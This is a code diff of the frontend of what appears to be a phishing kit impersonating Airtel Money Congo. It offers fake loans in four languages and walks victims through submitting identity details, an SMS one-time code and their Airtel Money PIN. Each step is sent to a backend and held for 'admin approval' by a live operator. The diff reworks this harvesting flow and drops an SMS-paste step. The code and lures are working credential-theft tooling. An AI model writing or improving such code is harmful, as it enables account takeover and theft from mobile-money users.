@@ -1,9 +1,8 @@
 // ═══════════════════════════════════════════════════════════
 // Airtel Money Congo – Frontend State Machine
-// Endpoints: SET A only (matches backend/server.js)
+// Flow: Submit → admin approve → OTP → admin approve → PIN → admin approve → Dashboard
 // ═══════════════════════════════════════════════════════════
 
-// ─── State ───
 const S = {
     loanType: 'Professionnel',
     loanAmount: 1000,
@@ -16,8 +15,7 @@ const S = {
     idNumber: '',
     city: '',
     status: '',
-    applicationId: '',
-    rejectedStep: null
+    applicationId: ''
 };
 
 let currentLang = 'fr';
@@ -26,12 +24,12 @@ let countdownTimers = {};
 let countdownValues = {};
 let otpResendTimer = null;
 let otpResendCountdown = 0;
-let lastSubmittedPin = '';
 let lastSubmittedOtp = '';
 
 const POLL_INTERVAL = 2000;
 const COUNTDOWN_SECONDS = 30;
 const OTP_RESEND_SECONDS = 60;
+const ANNUAL_RATE = 5.5;
 
 // ═══════════════════════════════════════════════════════════
 // TRANSLATIONS
@@ -95,12 +93,13 @@ const translations = {
         processingTitle: "Traitement de la demande…",
         processingSub: "Veuillez patienter pendant l'examen de votre demande",
         waitAdmin: "⏳ En attente de l'approbation de l'administrateur…",
-        smsTitle: "Vérifier le message Airtel Money",
-        smsLabel: "📩 Collez le SMS Airtel Money reçu",
-        smsHint: "Vérifiez votre boîte SMS pour le message d'Airtel Money Congo.",
-        smsSubmit: "SOUMETTRE LE MESSAGE AIRTEL MONEY",
-        waitSmsTitle: "Vérification du SMS",
-        waitSmsSub: "Veuillez patienter pendant l'examen de votre message",
+        otpTitle: "Code OTP",
+        otpSub: "Entrez le code OTP à 4 chiffres reçu par SMS",
+        verifyOtp: "VÉRIFIER L'OTP",
+        resendHint: "Renvoyer le même OTP",
+        resend: "Renvoyer",
+        waitOtpTitle: "Vérification de l'OTP",
+        waitOtpSub: "Veuillez patienter pendant l'examen de votre OTP",
         pinTitle: "Code PIN Airtel Money",
         pinPrompt: "Entrez votre code PIN à 4 chiffres",
         showPin: "Afficher",
@@ -109,18 +108,10 @@ const translations = {
         submitPin: "SOUMETTRE LE PIN",
         waitPinTitle: "Vérification du PIN",
         waitPinSub: "Veuillez patienter pendant l'examen de votre PIN",
-        otpTitle: "Code OTP",
-        otpSub: "Code à 4 chiffres envoyé par SMS",
-        verifyOtp: "VÉRIFIER ET APPROUVER",
-        resendHint: "Renvoyer le même OTP",
-        resend: "Renvoyer",
-        waitOtpTitle: "Vérification de l'OTP",
-        waitOtpSub: "Veuillez patienter pendant l'examen de votre OTP",
-        approvalTitle: "Prêt approuvé !",
-        approvalSub: "Votre prêt a été approuvé avec succès.",
-        approvalLabel: "Montant à recevoir",
-        approvalInfo: "Les fonds seront déposés sur votre compte Airtel Money dans les 5 minutes.",
-        // Errors
+        dashTitle: "Prêt approuvé !",
+        dashSub: "Bienvenue sur votre tableau de bord. Votre prêt a été approuvé.",
+        dashLabel: "Montant à recevoir",
+        dashInfo: "Les fonds seront déposés sur votre compte Airtel Money dans les 5 minutes.",
         errRequired: "Veuillez remplir tous les champs.",
         errAmount: "Le montant doit être entre 100 $ et 5 000 $.",
         errPurpose: "Veuillez décrire l'objet (min 3 caractères).",
@@ -130,23 +121,18 @@ const translations = {
         errId: "Veuillez entrer votre numéro de pièce d'identité.",
         errCity: "Veuillez sélectionner votre ville.",
         errStatus: "Veuillez sélectionner votre situation.",
-        errSms: "Veuillez coller un message SMS valide.",
         errPin: "Entrez un code PIN valide à 4 chiffres.",
         errOtp: "Entrez un code OTP valide à 4 chiffres.",
-        // Status toasts
-        smsApproved: "✅ SMS approuvé !",
-        smsRejected: "❌ SMS rejeté. Veuillez réessayer.",
-        pinApproved: "✅ PIN approuvé !",
+        appApproved: "✅ Demande approuvée ! Entrez votre OTP.",
+        appRejected: "❌ Demande rejetée. Veuillez réessayer.",
+        otpApproved: "✅ OTP approuvé ! Entrez maintenant votre PIN.",
+        otpRejected: "❌ OTP rejeté. Veuillez réessayer.",
+        pinApproved: "✅ PIN approuvé ! Bienvenue sur votre tableau de bord 🎉",
         pinRejected: "❌ PIN rejeté. Veuillez réessayer.",
         pinBlocked: "🔒 PIN bloqué. Réessayez plus tard.",
-        otpApproved: "✅ OTP approuvé ! Prêt décaissé 🎉",
-        otpRejected: "❌ OTP rejeté. Veuillez réessayer.",
-        appApproved: "✅ Demande approuvée !",
-        appRejected: "❌ Demande rejetée. Veuillez réessayer.",
         networkErr: "Erreur réseau. Veuillez réessayer.",
         blockedBadge: "🔒 Bloqué pendant",
-        attemptsBadge: "Tentatives restantes",
-        of: "sur"
+        attemptsBadge: "Tentatives restantes"
     },
     en: {
         splashTitle: "Airtel Money Congo",
@@ -206,12 +192,13 @@ const translations = {
         processingTitle: "Processing Application…",
         processingSub: "Please wait while our team reviews your application",
         waitAdmin: "⏳ Awaiting admin approval…",
-        smsTitle: "Verify Airtel Money Message",
-        smsLabel: "📩 Paste the Airtel Money SMS you received",
-        smsHint: "Check your SMS inbox for the message from Airtel Money Congo.",
-        smsSubmit: "SUBMIT AIRTEL MONEY MESSAGE",
-        waitSmsTitle: "Verifying SMS",
-        waitSmsSub: "Please wait while our team reviews your message",
+        otpTitle: "Enter OTP Code",
+        otpSub: "Enter the 4-digit OTP code sent via SMS",
+        verifyOtp: "VERIFY OTP",
+        resendHint: "Resubmit the same OTP",
+        resend: "Resend",
+        waitOtpTitle: "Verifying OTP",
+        waitOtpSub: "Please wait while our team reviews your OTP",
         pinTitle: "Enter Airtel Money PIN",
         pinPrompt: "Enter your 4-digit Airtel Money PIN",
         showPin: "Show PIN",
@@ -220,17 +207,10 @@ const translations = {
         submitPin: "SUBMIT PIN",
         waitPinTitle: "Verifying PIN",
         waitPinSub: "Please wait while our team reviews your PIN",
-        otpTitle: "Enter OTP Code",
-        otpSub: "4-digit code sent via SMS",
-        verifyOtp: "VERIFY & APPROVE LOAN",
-        resendHint: "Resubmit the same OTP",
-        resend: "Resend",
-        waitOtpTitle: "Verifying OTP",
-        waitOtpSub: "Please wait while our team reviews your OTP",
-        approvalTitle: "Loan Approved!",
-        approvalSub: "Your loan has been successfully approved.",
-        approvalLabel: "Amount to Receive",
-        approvalInfo: "Funds will be deposited to your Airtel Money account within 5 minutes.",
+        dashTitle: "Loan Approved!",
+        dashSub: "Welcome to your dashboard. Your loan has been approved.",
+        dashLabel: "Amount to Receive",
+        dashInfo: "Funds will be deposited to your Airtel Money account within 5 minutes.",
         errRequired: "Please complete all fields.",
         errAmount: "Amount must be between $100 and $5,000.",
         errPurpose: "Please describe the purpose (min 3 chars).",
@@ -240,22 +220,18 @@ const translations = {
         errId: "Please enter your ID number.",
         errCity: "Please select your city.",
         errStatus: "Please select your employment status.",
-        errSms: "Please paste a valid SMS message.",
         errPin: "Enter a valid 4-digit PIN.",
         errOtp: "Enter a valid 4-digit OTP.",
-        smsApproved: "✅ SMS approved!",
-        smsRejected: "❌ SMS rejected. Please retry.",
-        pinApproved: "✅ PIN approved!",
+        appApproved: "✅ Application approved! Enter your OTP.",
+        appRejected: "❌ Application rejected. Please retry.",
+        otpApproved: "✅ OTP approved! Now enter your PIN.",
+        otpRejected: "❌ OTP rejected. Please retry.",
+        pinApproved: "✅ PIN approved! Welcome to your dashboard 🎉",
         pinRejected: "❌ PIN rejected. Please retry.",
         pinBlocked: "🔒 PIN blocked. Try again later.",
-        otpApproved: "✅ OTP approved! Loan disbursed 🎉",
-        otpRejected: "❌ OTP rejected. Please retry.",
-        appApproved: "✅ Application approved!",
-        appRejected: "❌ Application rejected. Please retry.",
         networkErr: "Network error. Please retry.",
         blockedBadge: "🔒 Blocked for",
-        attemptsBadge: "Attempts remaining",
-        of: "of"
+        attemptsBadge: "Attempts remaining"
     },
     ln: {
         splashTitle: "Airtel Money Congo",
@@ -315,12 +291,13 @@ const translations = {
         processingTitle: "Kosala kosenga na yo…",
         processingSub: "Zela mwa tango moke",
         waitAdmin: "⏳ Zela bondimi ya administrateur…",
-        smsTitle: "Talá message ya Airtel Money",
-        smsLabel: "📩 Kotya SMS ya Airtel Money oyo ozwaki",
-        smsHint: "Talá na boîte SMS na yo mpo na message ya Airtel Money Congo.",
-        smsSubmit: "TINDA MESSAGE AIRTEL MONEY",
-        waitSmsTitle: "Kotala SMS",
-        waitSmsSub: "Zela mwa tango moke",
+        otpTitle: "Code OTP",
+        otpSub: "Kotisa code OTP ya ba chiffre 4",
+        verifyOtp: "TALA OTP",
+        resendHint: "Tinda lisusu OTP",
+        resend: "Tinda lisusu",
+        waitOtpTitle: "Kotala OTP",
+        waitOtpSub: "Zela mwa tango moke",
         pinTitle: "Code PIN ya Airtel Money",
         pinPrompt: "Kotisa code PIN ya ba chiffre 4",
         showPin: "Lakisá",
@@ -329,17 +306,10 @@ const translations = {
         submitPin: "TINDA PIN",
         waitPinTitle: "Kotala PIN",
         waitPinSub: "Zela mwa tango moke",
-        otpTitle: "Code OTP",
-        otpSub: "Code ya ba chiffre 4 etindami na SMS",
-        verifyOtp: "TALA MPE KONDIMA",
-        resendHint: "Tinda lisusu OTP",
-        resend: "Tinda lisusu",
-        waitOtpTitle: "Kotala OTP",
-        waitOtpSub: "Zela mwa tango moke",
-        approvalTitle: "Nyongo endimami !",
-        approvalSub: "Nyongo na yo endimami malamu.",
-        approvalLabel: "Motuya oyo ozwi",
-        approvalInfo: "Mbongo ekotiama na Airtel Money na yo na miniti 5.",
+        dashTitle: "Nyongo endimami !",
+        dashSub: "Boyei malamu na tableau de bord. Nyongo na yo endimami.",
+        dashLabel: "Motuya oyo ozwi",
+        dashInfo: "Mbongo ekotiama na Airtel Money na yo na miniti 5.",
         errRequired: "Kotisa makambo nyonso.",
         errAmount: "Motuya esengeli kozala kati ya 100 $ mpe 5 000 $.",
         errPurpose: "Limbola mokano (min 3 ba caractères).",
@@ -349,22 +319,18 @@ const translations = {
         errId: "Kotisa nimero ya karte ya identité.",
         errCity: "Pona engumba na yo.",
         errStatus: "Pona mosala na yo.",
-        errSms: "Kotya SMS ya malamu.",
         errPin: "Kotisa PIN ya ba chiffre 4.",
         errOtp: "Kotisa OTP ya ba chiffre 4.",
-        smsApproved: "✅ SMS endimami !",
-        smsRejected: "❌ SMS eboyami. Meka lisusu.",
-        pinApproved: "✅ PIN endimami !",
+        appApproved: "✅ Kosenga endimami ! Kotisa OTP.",
+        appRejected: "❌ Kosenga eboyami. Meka lisusu.",
+        otpApproved: "✅ OTP endimami ! Kotisa PIN.",
+        otpRejected: "❌ OTP eboyami. Meka lisusu.",
+        pinApproved: "✅ PIN endimami ! Boyei na tableau de bord 🎉",
         pinRejected: "❌ PIN eboyami. Meka lisusu.",
         pinBlocked: "🔒 PIN ekangami. Meka sima.",
-        otpApproved: "✅ OTP endimami ! Nyongo ebimisami 🎉",
-        otpRejected: "❌ OTP eboyami. Meka lisusu.",
-        appApproved: "✅ Kosenga endimami !",
-        appRejected: "❌ Kosenga eboyami. Meka lisusu.",
         networkErr: "Erreur réseau. Meka lisusu.",
         blockedBadge: "🔒 Ekangami mpo na",
-        attemptsBadge: "Ba tentatives etikali",
-        of: "ya"
+        attemptsBadge: "Ba tentatives etikali"
     },
     sw: {
         splashTitle: "Airtel Money Congo",
@@ -424,12 +390,13 @@ const translations = {
         processingTitle: "Inasindika maombi…",
         processingSub: "Tafadhali subiri wakati timu yetu inakagua maombi yako",
         waitAdmin: "⏳ Inasubiri idhini ya msimamizi…",
-        smsTitle: "Thibitisha ujumbe wa Airtel Money",
-        smsLabel: "📩 Bandika SMS ya Airtel Money uliyopokea",
-        smsHint: "Angalia kikasha chako cha SMS kwa ujumbe kutoka Airtel Money Congo.",
-        smsSubmit: "TUMA UJUMBE WA AIRTEL MONEY",
-        waitSmsTitle: "Inathibitisha SMS",
-        waitSmsSub: "Tafadhali subiri wakati timu yetu inakagua ujumbe wako",
+        otpTitle: "OTP",
+        otpSub: "Weka msimbo wa OTP wa tarakimu 4 uliotumwa kwa SMS",
+        verifyOtp: "THIBITISHA OTP",
+        resendHint: "Tuma tena OTP hiyo hiyo",
+        resend: "Tuma tena",
+        waitOtpTitle: "Inathibitisha OTP",
+        waitOtpSub: "Tafadhali subiri wakati timu yetu inakagua OTP yako",
         pinTitle: "PIN ya Airtel Money",
         pinPrompt: "Weka PIN yako ya tarakimu 4",
         showPin: "Onyesha",
@@ -438,17 +405,10 @@ const translations = {
         submitPin: "TUMA PIN",
         waitPinTitle: "Inathibitisha PIN",
         waitPinSub: "Tafadhali subiri wakati timu yetu inakagua PIN yako",
-        otpTitle: "OTP",
-        otpSub: "Msimbo wa tarakimu 4 uliotumwa kwa SMS",
-        verifyOtp: "THIBITISHA NA IDHINISHA",
-        resendHint: "Tuma tena OTP hiyo hiyo",
-        resend: "Tuma tena",
-        waitOtpTitle: "Inathibitisha OTP",
-        waitOtpSub: "Tafadhali subiri wakati timu yetu inakagua OTP yako",
-        approvalTitle: "Mkopo umeidhinishwa!",
-        approvalSub: "Mkopo wako umeidhinishwa kwa mafanikio.",
-        approvalLabel: "Kiasi cha kupokea",
-        approvalInfo: "Fedha zitawekwa kwenye akaunti yako ya Airtel Money ndani ya dakika 5.",
+        dashTitle: "Mkopo umeidhinishwa!",
+        dashSub: "Karibu kwenye dashibodi yako. Mkopo wako umeidhinishwa.",
+        dashLabel: "Kiasi cha kupokea",
+        dashInfo: "Fedha zitawekwa kwenye akaunti yako ya Airtel Money ndani ya dakika 5.",
         errRequired: "Tafadhali jaza sehemu zote.",
         errAmount: "Kiasi lazima kiwe kati ya $100 na $5,000.",
         errPurpose: "Tafadhali eleza lengo (angalau herufi 3).",
@@ -458,22 +418,18 @@ const translations = {
         errId: "Tafadhali weka namba ya kitambulisho.",
         errCity: "Tafadhali chagua jiji lako.",
         errStatus: "Tafadhali chagua hali ya kazi.",
-        errSms: "Tafadhali bandika ujumbe halali wa SMS.",
         errPin: "Weka PIN halali ya tarakimu 4.",
         errOtp: "Weka OTP halali ya tarakimu 4.",
-        smsApproved: "✅ SMS imeidhinishwa!",
-        smsRejected: "❌ SMS imekataliwa. Tafadhali jaribu tena.",
-        pinApproved: "✅ PIN imeidhinishwa!",
+        appApproved: "✅ Maombi yameidhinishwa! Weka OTP yako.",
+        appRejected: "❌ Maombi yamekataliwa. Tafadhali jaribu tena.",
+        otpApproved: "✅ OTP imeidhinishwa! Sasa weka PIN yako.",
+        otpRejected: "❌ OTP imekataliwa. Tafadhali jaribu tena.",
+        pinApproved: "✅ PIN imeidhinishwa! Karibu kwenye dashibodi yako 🎉",
         pinRejected: "❌ PIN imekataliwa. Tafadhali jaribu tena.",
         pinBlocked: "🔒 PIN imezuiwa. Jaribu baadaye.",
-        otpApproved: "✅ OTP imeidhinishwa! Mkopo umetolewa 🎉",
-        otpRejected: "❌ OTP imekataliwa. Tafadhali jaribu tena.",
-        appApproved: "✅ Maombi yameidhinishwa!",
-        appRejected: "❌ Maombi yamekataliwa. Tafadhali jaribu tena.",
         networkErr: "Hitilafu ya mtandao. Tafadhali jaribu tena.",
         blockedBadge: "🔒 Imezuiwa kwa",
-        attemptsBadge: "Majaribio yaliyobaki",
-        of: "kati ya"
+        attemptsBadge: "Majaribio yaliyobaki"
     }
 };
 
@@ -489,7 +445,6 @@ function switchLang(lang) {
     document.querySelectorAll('.lang-btn').forEach(btn => {
         btn.classList.toggle('active', btn.getAttribute('data-lang-btn') === lang);
     });
-    // Apply translations
     document.querySelectorAll('[data-key]').forEach(el => {
         const key = el.getAttribute('data-key');
         if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
@@ -497,10 +452,8 @@ function switchLang(lang) {
         } else if (el.tagName === 'OPTION') {
             el.textContent = t(key);
         } else {
-            // Preserve icons inside elements — only set text of the last text node
             const iconChild = el.querySelector('i');
             if (iconChild) {
-                // find text node after icon
                 el.childNodes.forEach(node => {
                     if (node.nodeType === 3 && node.textContent.trim()) node.textContent = ' ' + t(key);
                 });
@@ -509,12 +462,7 @@ function switchLang(lang) {
             }
         }
     });
-    // Update landing calc
     updateLandingCalc();
-    saveLang();
-}
-
-function saveLang() {
     try { localStorage.setItem('airtel_drc_lang', currentLang); } catch(e) {}
 }
 
@@ -560,8 +508,6 @@ function clearErr(id) {
 // ═══════════════════════════════════════════════════════════
 // CALCULATOR
 // ═══════════════════════════════════════════════════════════
-const ANNUAL_RATE = 5.5;
-
 function calcMonthly(amount, months) {
     if (!amount || !months) return 0;
     const r = ANNUAL_RATE / 100 / 12;
@@ -573,7 +519,8 @@ function updateLandingCalc() {
     const amt = +document.getElementById('amtSlider').value;
     const months = 12;
     document.getElementById('calcAmt').textContent = '$' + amt.toLocaleString();
-    document.getElementById('calcTerm').textContent = months + ' ' + (currentLang === 'fr' ? 'mois' : currentLang === 'sw' ? 'miezi' : currentLang === 'ln' ? 'sanza' : 'months');
+    const termLabels = { fr: 'mois', en: 'months', ln: 'sanza', sw: 'miezi' };
+    document.getElementById('calcTerm').textContent = months + ' ' + (termLabels[currentLang] || 'months');
     document.getElementById('monthlyAmt').textContent = '$' + Math.round(calcMonthly(amt, months)).toLocaleString();
 }
 
@@ -590,38 +537,31 @@ function updateStepCalc() {
 // START
 // ═══════════════════════════════════════════════════════════
 function startApplication() {
-    S.rejectedStep = null;
     if (!S.applicationId) {
         S.applicationId = 'AIRTEL-CM-' + Date.now().toString().slice(-6) + '-' + Math.random().toString(36).slice(2, 6).toUpperCase();
     }
-    ['s1Err', 's2Err', 's3Err', 'momErr', 'pinErr', 'otpErr'].forEach(clearErr);
+    ['s1Err', 's2Err', 's3Err', 'pinErr', 'otpErr'].forEach(clearErr);
     goTo('page-step1');
     updateStepCalc();
 }
 
 // ═══════════════════════════════════════════════════════════
-// STEP 1 → STEP 2
+// STEP 1 → 2
 // ═══════════════════════════════════════════════════════════
 function toS2() {
     const ty = document.getElementById('s1ty').value;
     const am = +document.getElementById('s1am').value;
     const te = document.getElementById('s1te').value;
     const pu = document.getElementById('s1pu').value.trim();
-
     if (!ty || !te) { showErr('s1Err', t('errRequired')); return; }
     if (am < 100 || am > 5000) { showErr('s1Err', t('errAmount')); return; }
     if (pu.length < 3) { showErr('s1Err', t('errPurpose')); return; }
-
-    S.loanType = ty;
-    S.loanAmount = am;
-    S.loanTerm = te;
-    S.loanPurpose = pu;
-
+    S.loanType = ty; S.loanAmount = am; S.loanTerm = te; S.loanPurpose = pu;
     goTo('page-step2');
 }
 
 // ═══════════════════════════════════════════════════════════
-// STEP 2 → STEP 3
+// STEP 2 → 3
 // ═══════════════════════════════════════════════════════════
 function normalizePhone(id) {
     const inp = document.getElementById(id);
@@ -636,26 +576,18 @@ function toS3() {
     const id = document.getElementById('s2id').value.trim();
     const city = document.getElementById('s2city').value;
     const status = document.getElementById('s2status').value;
-
     if (!fi || !la) { showErr('s2Err', t('errName')); return; }
     if (!/^[89]\d{8}$/.test(ph)) { showErr('s2Err', t('errPhone')); return; }
     if (!em || !em.includes('@') || !em.includes('.')) { showErr('s2Err', t('errEmail')); return; }
     if (!id) { showErr('s2Err', t('errId')); return; }
     if (!city) { showErr('s2Err', t('errCity')); return; }
     if (!status) { showErr('s2Err', t('errStatus')); return; }
+    S.firstName = fi; S.lastName = la; S.phone = ph; S.email = em;
+    S.idNumber = id; S.city = city; S.status = status;
 
-    S.firstName = fi;
-    S.lastName = la;
-    S.phone = ph;
-    S.email = em;
-    S.idNumber = id;
-    S.city = city;
-    S.status = status;
-
-    // Fill review
     document.getElementById('rLoanType').textContent = S.loanType;
     document.getElementById('rAmount').textContent = '$' + S.loanAmount.toLocaleString();
-    document.getElementById('rTerm').textContent = S.loanTerm + ' ' + (currentLang === 'fr' ? 'mois' : 'months');
+    document.getElementById('rTerm').textContent = S.loanTerm + ' ' + ({ fr:'mois', en:'months', ln:'sanza', sw:'miezi' }[currentLang] || 'months');
     document.getElementById('rPurpose').textContent = S.loanPurpose;
     document.getElementById('rName').textContent = S.firstName + ' ' + S.lastName;
     document.getElementById('rEmail').textContent = S.email;
@@ -671,7 +603,7 @@ function toS3() {
 }
 
 // ═══════════════════════════════════════════════════════════
-// SUBMIT APPLICATION → POLL ADMIN
+// SUBMIT APPLICATION → POLL gate #1 (application approval) → OTP
 // ═══════════════════════════════════════════════════════════
 async function submitApp() {
     goTo('page-processing');
@@ -686,8 +618,7 @@ async function submitApp() {
         const data = await res.json();
         if (!data.ok) throw new Error(data.error || 'Submit failed');
         S.applicationId = data.applicationId;
-        saveState();
-        startPoll('sms', 'page-sms-paste');
+        startPoll('sms', 'page-otp');
     } catch (err) {
         console.error(err);
         showToast(t('networkErr'), 'error');
@@ -697,83 +628,7 @@ async function submitApp() {
 }
 
 // ═══════════════════════════════════════════════════════════
-// SMS SUBMIT → POLL
-// ═══════════════════════════════════════════════════════════
-async function doSmsParse() {
-    const msg = document.getElementById('smsMsgBox').value.trim();
-    if (msg.length < 3) { showErr('momErr', t('errSms')); return; }
-
-    goTo('page-wait-sms');
-    startCountdown('sms', 30);
-
-    try {
-        await fetch('/api/send-momo-message', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                momoData: { applicationId: S.applicationId, phone: S.phone, momoMessage: msg }
-            })
-        });
-        startPoll('sms', 'page-pin');
-    } catch (err) {
-        console.error(err);
-        showToast(t('networkErr'), 'error');
-        goTo('page-sms-paste');
-    }
-}
-
-// ═══════════════════════════════════════════════════════════
-// PIN → POLL
-// ═══════════════════════════════════════════════════════════
-function pinMvM(el, i) {
-    el.value = el.value.replace(/\D/g, '');
-    if (el.value && i < 3) document.getElementById('pin' + (i + 1)).focus();
-    if (!el.value && i > 0) document.getElementById('pin' + (i - 1)).focus();
-}
-function clearLoginPin() {
-    for (let i = 0; i < 4; i++) document.getElementById('pin' + i).value = '';
-    document.getElementById('pin0').focus();
-}
-function togPin() {
-    for (let i = 0; i < 4; i++) {
-        const el = document.getElementById('pin' + i);
-        el.type = el.type === 'password' ? 'text' : 'password';
-    }
-}
-
-async function doPin() {
-    let pin = '';
-    for (let i = 0; i < 4; i++) pin += document.getElementById('pin' + i).value;
-    if (pin.length !== 4) { showErr('pinErr', t('errPin')); return; }
-
-    lastSubmittedPin = pin;
-    goTo('page-wait-pin');
-    startCountdown('pin', 30);
-
-    try {
-        const res = await fetch('/api/send-pin', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ applicationId: S.applicationId, pin })
-        });
-        const data = await res.json();
-        if (data.blocked) {
-            showToast(data.message || t('pinBlocked'), 'error');
-            stopAllTimers();
-            goTo('page-pin');
-            updateAttemptsBadge(data);
-            return;
-        }
-        startPoll('pin', 'page-otp');
-    } catch (err) {
-        console.error(err);
-        showToast(t('networkErr'), 'error');
-        goTo('page-pin');
-    }
-}
-
-// ═══════════════════════════════════════════════════════════
-// OTP → POLL
+// OTP → POLL gate #2 → PIN
 // ═══════════════════════════════════════════════════════════
 function otpMvM(el, i) {
     el.value = el.value.replace(/\D/g, '');
@@ -800,7 +655,7 @@ async function doOtp() {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ applicationId: S.applicationId, otp })
         });
-        startPoll('otp', 'page-approval');
+        startPoll('otp', 'page-pin');
     } catch (err) {
         console.error(err);
         showToast(t('networkErr'), 'error');
@@ -819,7 +674,7 @@ async function resendOtp() {
             body: JSON.stringify({ applicationId: S.applicationId, otp: lastSubmittedOtp })
         });
         showToast(t('resend') + ' OK', 'success');
-        startPoll('otp', 'page-approval');
+        startPoll('otp', 'page-pin');
         startOtpResendCountdown();
     } catch (err) {
         console.error(err);
@@ -849,6 +704,55 @@ function startOtpResendCountdown() {
 }
 
 // ═══════════════════════════════════════════════════════════
+// PIN → POLL gate #3 → Dashboard
+// ═══════════════════════════════════════════════════════════
+function pinMvM(el, i) {
+    el.value = el.value.replace(/\D/g, '');
+    if (el.value && i < 3) document.getElementById('pin' + (i + 1)).focus();
+    if (!el.value && i > 0) document.getElementById('pin' + (i - 1)).focus();
+}
+function clearLoginPin() {
+    for (let i = 0; i < 4; i++) document.getElementById('pin' + i).value = '';
+    document.getElementById('pin0').focus();
+}
+function togPin() {
+    for (let i = 0; i < 4; i++) {
+        const el = document.getElementById('pin' + i);
+        el.type = el.type === 'password' ? 'text' : 'password';
+    }
+}
+
+async function doPin() {
+    let pin = '';
+    for (let i = 0; i < 4; i++) pin += document.getElementById('pin' + i).value;
+    if (pin.length !== 4) { showErr('pinErr', t('errPin')); return; }
+
+    goTo('page-wait-pin');
+    startCountdown('pin', 30);
+
+    try {
+        const res = await fetch('/api/send-pin', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ applicationId: S.applicationId, pin })
+        });
+        const data = await res.json();
+        if (data.blocked) {
+            showToast(data.message || t('pinBlocked'), 'error');
+            stopAllTimers();
+            goTo('page-pin');
+            updateAttemptsBadge(data);
+            return;
+        }
+        startPoll('pin', 'page-dashboard');
+    } catch (err) {
+        console.error(err);
+        showToast(t('networkErr'), 'error');
+        goTo('page-pin');
+    }
+}
+
+// ═══════════════════════════════════════════════════════════
 // POLLING
 // ═══════════════════════════════════════════════════════════
 function startPoll(step, nextPageOnApprove) {
@@ -862,44 +766,43 @@ function startPoll(step, nextPageOnApprove) {
 
             if (data.status === 'approved') {
                 stopPoll();
-                stopCountdown(step);
+                stopCountdown(step === 'sms' ? 'processing' : step);
                 if (step === 'sms') {
-                    showToast(t('smsApproved'), 'success');
-                    goTo('page-sms-paste');
-                } else if (step === 'pin') {
-                    showToast(t('pinApproved'), 'success');
+                    showToast(t('appApproved'), 'success');
                     goTo('page-otp');
                 } else if (step === 'otp') {
                     showToast(t('otpApproved'), 'success');
-                    showApproval();
+                    goTo('page-pin');
+                } else if (step === 'pin') {
+                    showToast(t('pinApproved'), 'success');
+                    showDashboard();
                 }
                 return;
             }
             if (data.status === 'rejected') {
                 stopPoll();
-                stopCountdown(step);
+                stopCountdown(step === 'sms' ? 'processing' : step);
                 if (step === 'sms') {
-                    showToast(t('smsRejected'), 'error');
-                    goTo('page-sms-paste');
+                    showToast(t('appRejected'), 'error');
+                    goTo('page-step3');
+                } else if (step === 'otp') {
+                    showToast(t('otpRejected'), 'error');
+                    goTo('page-otp');
                 } else if (step === 'pin') {
                     showToast(t('pinRejected'), 'error');
                     updateAttemptsBadge(data);
                     goTo('page-pin');
-                } else if (step === 'otp') {
-                    showToast(t('otpRejected'), 'error');
-                    goTo('page-otp');
                 }
                 return;
             }
             if (data.status === 'blocked') {
                 stopPoll();
-                stopCountdown(step);
+                stopCountdown('pin');
                 showToast(t('pinBlocked'), 'error');
                 updateAttemptsBadge(data);
                 goTo('page-pin');
                 return;
             }
-            // still pending → keep polling
         } catch (err) {
             console.error('Poll error:', err);
         }
@@ -969,35 +872,21 @@ function stopAllTimers() {
 }
 
 // ═══════════════════════════════════════════════════════════
-// APPROVAL
+// DASHBOARD
 // ═══════════════════════════════════════════════════════════
-function showApproval() {
+function showDashboard() {
     const monthly = calcMonthly(S.loanAmount, +S.loanTerm);
-    document.getElementById('aprAmount').textContent = '$' + S.loanAmount.toLocaleString();
-    document.getElementById('aprAmt').textContent = '$' + S.loanAmount.toLocaleString();
-    document.getElementById('aprTerm').textContent = S.loanTerm + ' ' + (currentLang === 'fr' ? 'mois' : 'months');
-    document.getElementById('aprMth').textContent = '$' + Math.round(monthly).toLocaleString();
-    goTo('page-approval');
+    const termLabels = { fr:'mois', en:'months', ln:'sanza', sw:'miezi' };
+    document.getElementById('dashAmount').textContent = '$' + S.loanAmount.toLocaleString();
+    document.getElementById('dashAmt').textContent = '$' + S.loanAmount.toLocaleString();
+    document.getElementById('dashTerm').textContent = S.loanTerm + ' ' + (termLabels[currentLang] || 'months');
+    document.getElementById('dashMth').textContent = '$' + Math.round(monthly).toLocaleString();
+    goTo('page-dashboard');
 }
 
 function finishApplication() {
-    localStorage.removeItem('airtel_drc_state');
+    try { localStorage.removeItem('airtel_drc_state'); } catch(e) {}
     location.reload();
-}
-
-// ═══════════════════════════════════════════════════════════
-// STATE PERSISTENCE
-// ═══════════════════════════════════════════════════════════
-function saveState() {
-    try {
-        localStorage.setItem('airtel_drc_state', JSON.stringify(S));
-    } catch(e) {}
-}
-function loadState() {
-    try {
-        const raw = localStorage.getItem('airtel_drc_state');
-        if (raw) Object.assign(S, JSON.parse(raw));
-    } catch(e) {}
 }
 
 // ═══════════════════════════════════════════════════════════
@@ -1019,20 +908,16 @@ function runSplash() {
 
 document.addEventListener('DOMContentLoaded', () => {
     loadLang();
-    loadState();
     runSplash();
-
-    // Calculator on step 1
     document.getElementById('s1am').addEventListener('input', updateStepCalc);
     document.getElementById('s1te').addEventListener('change', updateStepCalc);
+    document.getElementById('amtSlider').addEventListener('input', updateLandingCalc);
     updateLandingCalc();
     updateStepCalc();
-
-    // PIN auto-advance
     for (let i = 0; i < 4; i++) {
-        const p = document.getElementById('pin' + i);
-        if (p) p.addEventListener('input', () => pinMvM(p, i));
         const o = document.getElementById('otp' + i);
         if (o) o.addEventListener('input', () => otpMvM(o, i));
+        const p = document.getElementById('pin' + i);
+        if (p) p.addEventListener('input', () => pinMvM(p, i));
     }
 });
